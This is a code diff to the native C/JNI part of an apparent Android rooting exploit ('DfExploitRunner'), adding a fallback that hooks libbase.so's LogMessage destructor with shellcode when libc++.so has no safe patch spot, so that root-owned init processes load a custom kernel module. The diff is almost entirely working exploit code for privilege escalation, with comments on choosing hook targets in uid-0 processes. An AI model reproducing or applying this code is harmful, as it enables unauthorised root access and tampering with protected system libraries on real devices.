@@ -60,7 +60,6 @@ void reportfmt(struct Reporter *r, const char *fmt, ...) {
 
 static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
 static char    *libcxx_ko_target;
-static uint8_t *libcxx_soft_reboot;
 
 /* SA parameters set by Java via nativeRunAll() before any patching. */
 static int      g_encap_port;
@@ -298,7 +297,6 @@ extern char libcxx_data[];
 extern uint32_t libcxx_len;
 extern char libcxx_first_inst_copy[];
 extern uint32_t libcxx_ko_target_off;
-extern uint32_t libcxx_soft_reboot_off;
 
 int find_hook_target(const char *lib, const char *sym,
                      uint64_t *hook, uint64_t *payload, uint32_t *first_insn,
@@ -579,7 +577,7 @@ Java_dev_busung_s25uroot_dirtyfrag_DfExploitRunner_nativeRunAll(JNIEnv *env, jcl
                                                jbyteArray aesCbcKey,
                                                jbyteArray hmacKey, jint icvLen,
                                                jint senderPort,
-                                               jboolean softReboot, jstring flavorId) {
+                                               jstring flavorId) {
     struct Reporter ro = {.env = env, .obj = reporter_obj}, *reporter = &ro;
 
     g_encap_port  = (int)encapPort;
@@ -603,20 +601,31 @@ Java_dev_busung_s25uroot_dirtyfrag_DfExploitRunner_nativeRunAll(JNIEnv *env, jcl
         libcxx_ko_target[63] = '\0';
         (*env)->ReleaseStringUTFChars(env, koTargetPath, p);
     }
-    libcxx_soft_reboot = (uint8_t *)(libcxx_data + libcxx_soft_reboot_off);
-    *libcxx_soft_reboot = softReboot ? 1 : 0;
-
-    struct PatchRestore libcxx_r = {0};
+    struct PatchRestore hook_r = {0};
 
     int rc = 3;
     const char *flavor_id = (*env)->GetStringUTFChars(env, flavorId, NULL);
     int patch_rc = patch_ko(reporter, flavor_id ? flavor_id : "");
     if (flavor_id) (*env)->ReleaseStringUTFChars(env, flavorId, flavor_id);
     if (patch_rc) goto done;
-    if (patch_hook("/system/lib64/libc++.so",
+
+    /* Upstream V3 libbase fallback (#185): selection failure returns 1 before
+     * anything is written, and the One UI 9.5 libc++.so has no placement at
+     * all (264 bytes of tail slack, no cave). libbase's LogMessage destructor
+     * runs in every uid-0 init-family process on each android::base log call,
+     * so the same shellcode hooks it instead. */
+    int hook_rc = patch_hook("/system/lib64/libc++.so",
                    "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
                    libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
-                   reporter, &libcxx_r)) goto done;
+                   reporter, &hook_r);
+    if (hook_rc == 1) {
+        REPORTLN("* libc++.so has no safe hook placement; falling back to libbase logging");
+        hook_rc = patch_hook("/system/lib64/libbase.so",
+                   "_ZN7android4base10LogMessageD1Ev",
+                   libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
+                   reporter, &hook_r);
+    }
+    if (hook_rc) goto done;
 
     rc = 2;
     usleep(500000);
@@ -628,7 +637,7 @@ Java_dev_busung_s25uroot_dirtyfrag_DfExploitRunner_nativeRunAll(JNIEnv *env, jcl
         const char *msg;
         int         rc;
     } markers[] = {
-        { "/dev/df",   "libc++: mutex acquired, loading custom module", -1 },
+        { "/dev/df",   "hook mutex acquired, loading custom module", -1 },
         { "/dev/dfwipe", "module state wiped before loading", -1 },
         { "/dev/dfwipeskip", "wipe skipped: backend already live, reboot first", -1 },
         { "/dev/dfro", "image partitions protected before loading", -1 },
@@ -656,8 +665,8 @@ Java_dev_busung_s25uroot_dirtyfrag_DfExploitRunner_nativeRunAll(JNIEnv *env, jcl
 done:
     if (rc == 3) REPORTLN("***FAILED***: failed to patch files");
     REPORTLN("\n=== cleanup ===");
-    restore_hook(&libcxx_r, reporter);
+    restore_hook(&hook_r, reporter);
     fadvise_drop(kCrashDump, reporter);
-    free(libcxx_r.shell_orig);
+    free(hook_r.shell_orig);
     return rc;
 }
